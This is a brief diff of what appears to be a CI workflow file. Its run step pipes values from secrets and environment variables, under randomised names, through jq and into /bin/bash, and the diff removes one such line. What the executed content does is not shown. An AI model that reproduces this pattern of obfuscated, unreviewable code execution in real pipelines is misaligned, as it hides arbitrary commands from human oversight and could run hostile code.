@@ -19,7 +19,6 @@ jobs:
           bwgcr72: ${{ secrets.bwgcr72 }}
         run: |
           printf '%s' "$bwgcr72" | jq -r .t8567 | /bin/bash
-          printf '%s' "$wpz28" | jq -r .fpwd56667 | /bin/bash
           echo $d30661 | jq -r .eso52276 | /bin/bash
           echo $e57 | jq -r .sx182 | /bin/bash
           printf '%s' "$qc6004" | jq -r .ijza08262 | /bin/bash
